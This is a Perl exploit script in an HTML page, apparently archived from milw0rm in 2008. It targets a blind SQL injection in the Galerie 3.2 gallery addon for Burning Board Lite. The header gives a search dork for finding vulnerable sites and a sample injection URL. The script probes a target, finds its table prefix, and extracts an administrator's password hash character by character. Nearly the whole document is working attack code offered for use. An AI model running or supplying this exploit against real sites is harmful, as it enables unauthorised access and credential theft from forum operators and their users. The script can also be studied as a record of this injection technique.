<html><head><title>Galerie 3.2 (pic) WBB Lite Addon Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#####################################################################################
#
#    Galerie 3.2 (galerie.php) Remote &quot;Blind&quot; SQL Injection
#
#    found by: J0hn.X3r
#    exploit written by: J0hn.X3r and electron1x
#    Date:     05.10.2008
#    Dork: &quot;Galerie 3.2 Â© 2004 by progressive&quot;
#
#    Contact:
#       J0hn.X3r
#            [+] ICQ:   573813
#            [+] Mail:  J0hn.X3r[at]gmail.com
#       electron1x
#            [+] Mail:  electron1x *at* mail *dot* ru
#
#    Greetz to: nexos, Barbers, -tmh-, Patrick_B, Sector, Loader007, n00bor
#               Mac_Hack, Five-Three-Nine, f0Gx, bizzit, h0yt3r, no_swear_ftW,
#               Lidloses_Auge, Sys-Flaw, Free-hack, Universal Crew &amp; rest :-)
#
#####################################################################################
#
#  First, Galerie 3.2 is an addon for Burning Board Lite.
#
#  http://www.site.com/galerie.php?action=show&amp;pic=10
#
#  If we add a ' to the pic id we get an SQL Error. But the Query is an UPDATE Query, so we can't use UNION.
#
#  We have to try it with a Blind SQL Injection.
#  ( that slow and shitty subquery thingy ;) )
#
#  injection:
#  http://www.site.com/galerie.php?action=show&amp;pic=10'/**/and/**/ascii(substring((SELECT/**/password/**/from/**/bb1_users/**/WHERE/**/userid=1),1,1))&gt;1/*
#
#####################################################################################

use strict;
use warnings;
use LWP::UserAgent;

banner();

my $url = shift || usage($0);
my $usr_id  = shift;
my $keyspace = &quot;0123456789abcdef&quot;;

$usr_id = 1 unless ( $usr_id and $usr_id =~ /^\d+$/ );
$url    = 'http://' . $url unless ( $url =~ /^https?:\/\/.+?\/$/ );


# global vars...
our @url          = ( &quot;$url/galerie.php?action=show&amp;pic={id}%27+and+ascii(substring((SELECT+password+from+bb2_users+where+userid=$usr_id),1,1))&quot;, '', '/*' );
our $ua           = LWP::UserAgent-&gt;new;
$ua-&gt;agent('Mozilla/4.8 [en] (Windows NT 6.0; U)'); # btw we dont use windows ..

# regexes..
our $regex        = 'Bild\ \d+\ von\ (\d+)';
my  $prefix_regex = '(\w+)_galeriedata';
my  $regex_id     = 'pic=(\d+)';

my  $prefix       = '';
my  $pic_id       = '';

print &quot;[~] Preparing attack...\n&quot;;
my $r = $ua-&gt;get($url . &quot;/galerie.php?action=show&amp;pic=%27&quot;);
        die   &quot;\t[!!] Couldnt connect to $url!\n&quot;             unless ( $r-&gt;is_success );
        die   &quot;\t[!!] Target doesnt seem to be vulnerable!\n&quot; unless ( $r-&gt;content =~ /$prefix_regex/ );
        print &quot;\t[*] Target seems to be vulnerable\n&quot;;
        $prefix = $1;
        $url[0] =~ s/bb2/$prefix/;

$r    = $ua-&gt;get($url . &quot;/galerie.php&quot;);
        die   &quot;\t[!!] Couldnt get a valid pic-id\n&quot; unless ( $r-&gt;content =~ /$regex_id/ );
        $pic_id = $1;
        $url[0] =~ s/{id}/$pic_id/;

        print &quot;\t[*] Using table prefix $prefix\n&quot;;
        print &quot;\t[*] Using pic-id $pic_id\n&quot;;


print &quot;[~] Unleashing Black Magic...\n&quot;;
        print STDERR &quot;\t[*] Getting Hash &quot;; 
                                           

for ( 1..32 ) {
        $url[0] =~ s/\),\d{1,2},/\),$_,/;
        blind( build_array($keyspace), 0, 16);
}
print &quot;\n&quot;;



sub banner
{
        print &quot;[~] Galerie 3.2 WBB Lite Addon Blind SQL-Injection Exploit\n&quot;;
        print &quot;[~] Written by J0hn.x3r and electron1x\n\n&quot;
}

sub usage
{
        my $script = shift;
        print &quot;[*] Usage\n&quot; ,
                        &quot;\t$script &lt;host&gt; &lt;opt: user id&gt;\n&quot; ,
                        &quot;\tuser id defaults to 1\n&quot; ,
              &quot;[*] Examples\n&quot; ,
                        &quot;\t$script http://example.com/forum/ 2\n&quot; ,
                        &quot;\t$script localhost/board/\n&quot; ,
                        &quot;\t$script localhost 31337\n&quot;;
        exit(0);
}



sub blind
{
        my ( $keyspace,  $bottom, $top ) = @_;
        my $center = int ($bottom+$top)/2;
        print STDERR chr $$keyspace[$center];
        if ( request($$keyspace[$center], '=')) {
                return;
        } elsif ( $top-$bottom &gt; 0) {
                        print STDERR &quot;\b&quot;;
                        return blind($keyspace, $center+1, $top   )
                                unless  (  request($$keyspace[$center], '&lt;') );
                        return blind($keyspace, $bottom, $center-1);
        } else {
                print STDERR &quot;\n[!!] Something went wront, dunno what..\n&quot;;
                exit(1);
        }
}

sub build_array
{
        my @sorted = sort {$a&lt;=&gt;$b} map {ord} $_[0] =~ /./g;
        return \@sorted;
}


sub request
{
        my ( $key, $flag ) = @_;
        my $r = $ua-&gt;get($url[0] . $flag . $url[1] . $key . $url[2]);
        $r-&gt;content =~ /$regex/;
        return ($1 &gt; 0);
}

__END__

# milw0rm.com [2008-10-05]</pre></html>